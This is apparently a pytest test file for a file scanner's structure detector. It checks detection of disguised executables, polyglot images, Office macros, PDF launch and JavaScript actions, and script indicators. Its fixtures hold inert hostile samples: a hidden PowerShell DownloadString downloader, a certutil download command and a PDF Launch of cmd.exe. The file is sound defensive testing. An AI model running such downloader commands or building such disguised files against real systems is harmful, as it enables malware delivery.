import pytest

from netscan.core.detectors.base import ScanTarget
from netscan.core.detectors.structure import StructureDetector, shannon_entropy
from netscan.core.filetype import identify
from netscan.core.result import Verdict

from .conftest import FAKE_PE, JPEG, PNG, make_zip


@pytest.fixture
def detector() -> StructureDetector:
    return StructureDetector()


def rules(detector: StructureDetector, data: bytes, name: str | None) -> dict[str, Verdict]:
    target = ScanTarget(data=data, name=name, ftype=identify(data, name))
    return {f.rule: f.verdict for f in detector.inspect(target)}


class TestDisguises:
    def test_executable_named_pdf(self, detector):
        found = rules(detector, FAKE_PE, "invoice.pdf")
        assert found["extension_content_mismatch"] == Verdict.MALICIOUS

    def test_double_extension(self, detector):
        assert rules(detector, FAKE_PE, "invoice.pdf.exe")["double_extension"] == Verdict.MALICIOUS

    def test_double_extension_needs_a_decoy(self, detector):
        # setup.exe is honest about being an executable.
        assert "double_extension" not in rules(detector, FAKE_PE, "setup.exe")

    def test_bidi_override(self, detector):
        found = rules(detector, FAKE_PE, "photo‮gpj.exe")
        assert found["filename_bidi_override"] == Verdict.MALICIOUS

    def test_risky_extension_flagged(self, detector):
        assert rules(detector, FAKE_PE, "tool.exe")["risky_extension"] == Verdict.SUSPICIOUS

    def test_clean_file_has_no_findings(self, detector):
        assert rules(detector, b"plain notes\n" * 20, "notes.txt") == {}

    def test_clean_png_has_no_findings(self, detector):
        assert rules(detector, PNG, "logo.png") == {}

    def test_control_characters_in_name(self, detector):
        assert "filename_control_characters" in rules(detector, b"hi", "a\nb.txt")


class TestAppendedData:
    def test_executable_after_png_iend(self, detector):
        found = rules(detector, PNG + FAKE_PE, "holiday.png")
        assert found["polyglot_file"] == Verdict.MALICIOUS
        assert found["executable_inside_media_file"] == Verdict.MALICIOUS
        assert found["data_after_end_of_file"] == Verdict.SUSPICIOUS

    def test_executable_after_jpeg_marker(self, detector):
        assert "polyglot_file" in rules(detector, JPEG + FAKE_PE, "photo.jpg")

    def test_small_trailing_padding_ignored(self, detector):
        assert "data_after_end_of_file" not in rules(detector, PNG + b"\n\n\x00", "logo.png")

    def test_text_appended_to_png_is_only_suspicious(self, detector):
        found = rules(detector, PNG + b"a note hidden in here, at length" * 4, "logo.png")
        assert found["data_after_end_of_file"] == Verdict.SUSPICIOUS
        assert "polyglot_file" not in found

    def test_pdf_trailing_data(self, detector):
        pdf = b"%PDF-1.7\ntrailer<</Root 1 0 R>>\n%%EOF\n"
        assert "data_after_end_of_file" in rules(detector, pdf + b"X" * 64, "a.pdf")


class TestDocuments:
    def test_macro_in_docx_is_malicious(self, detector):
        data = make_zip({
            "word/document.xml": b"<x/>",
            "word/vbaProject.bin": b"\x00" * 64,
        })
        found = rules(detector, data, "contract.docx")
        assert found["macro_in_macro_free_extension"] == Verdict.MALICIOUS

    def test_macro_in_docm_is_only_suspicious(self, detector):
        data = make_zip({"word/document.xml": b"<x/>", "word/vbaProject.bin": b"\x00" * 64})
        found = rules(detector, data, "contract.docm")
        assert found["office_macro_project"] == Verdict.SUSPICIOUS
        assert "macro_in_macro_free_extension" not in found

    def test_pdf_launch_action_is_malicious(self, detector):
        pdf = b"%PDF-1.7\n1 0 obj<</Type/Action/S/Launch/F(cmd.exe)>>endobj\n%%EOF"
        assert rules(detector, pdf, "a.pdf")["pdf_launch_action"] == Verdict.MALICIOUS

    def test_pdf_javascript_and_openaction(self, detector):
        pdf = b"%PDF-1.7\n<</OpenAction<</S/JavaScript/JS(evil())>>>>\n%%EOF"
        found = rules(detector, pdf, "a.pdf")
        assert "pdf_javascript" in found
        assert "pdf_auto_open_action" in found

    def test_plain_pdf_is_clean(self, detector):
        pdf = b"%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
        assert rules(detector, pdf, "report.pdf") == {}

    def test_rtf_embedded_object(self, detector):
        rtf = rb"{\rtf1\ansi {\object\objupdate\objdata 0105000002000000}}"
        assert "rtf_embedded_object" in rules(detector, rtf, "a.rtf")


class TestScripts:
    def test_powershell_downloader(self, detector):
        script = (b"powershell -nop -w hidden -enc AAA\n"
                  b"$c = (New-Object Net.WebClient).DownloadString('http://x.test')\n")
        found = rules(detector, script, "update.txt")
        assert "powershell_encoded_command" in found
        assert "script_downloader" in found
        assert "hidden_window_execution" in found

    def test_certutil_abuse(self, detector):
        assert "certutil_abuse" in rules(detector, b"certutil -urlcache -f http://x a.exe", "a.bat")

    def test_large_base64_blob(self, detector):
        blob = b"var x = '" + b"QUJDRA" * 200 + b"';"
        assert "large_base64_blob" in rules(detector, blob, "a.js")

    def test_ordinary_script_is_clean(self, detector):
        # .sh is not in RISKY_EXTENSIONS: it is not auto-executed on open the way
        # .bat/.vbs/.js are, and flagging every shell script would drown the log.
        assert rules(detector, b"#!/bin/sh\necho hello\n", "hello.sh") == {}

    def test_windows_script_extension_is_risky(self, detector):
        assert rules(detector, b"echo hello\n", "hello.bat") == {
            "risky_extension": Verdict.SUSPICIOUS
        }


class TestEntropy:
    def test_entropy_of_uniform_data_is_zero(self):
        assert shannon_entropy(b"\x00" * 1000) == 0.0

    def test_entropy_of_random_data_is_high(self):
        import os
        assert shannon_entropy(os.urandom(65536)) > 7.9

    def test_entropy_of_empty_is_zero(self):
        assert shannon_entropy(b"") == 0.0

    def test_high_entropy_reported_for_unknown_blob(self, detector):
        import os
        assert "high_entropy_content" in rules(detector, os.urandom(65536), "blob.dat")

    def test_containers_exempt_from_entropy_check(self, detector):
        import os
        data = make_zip({"r.bin": os.urandom(65536)})
        assert "high_entropy_content" not in rules(detector, data, "a.zip")

    def test_small_files_exempt(self, detector):
        import os
        assert "high_entropy_content" not in rules(detector, os.urandom(512), "a.dat")


class TestRobustness:
    @pytest.mark.parametrize("data", [b"", b"\x00", b"%PDF-", b"MZ", bytes(range(256))])
    def test_never_raises_on_odd_input(self, detector, data):
        detector.inspect(ScanTarget(data=data, name="x", ftype=identify(data, "x")))

    def test_handles_none_name(self, detector):
        detector.inspect(ScanTarget(data=FAKE_PE, name=None, ftype=identify(FAKE_PE)))
